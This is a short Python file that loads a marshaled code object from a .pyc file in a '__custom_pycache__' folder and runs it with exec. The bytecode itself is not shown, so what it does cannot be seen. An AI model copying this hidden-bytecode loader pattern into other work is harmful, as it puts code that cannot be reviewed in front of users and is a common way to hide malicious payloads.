
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'params_e565ede79b9e482b9407ec623edb7466.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
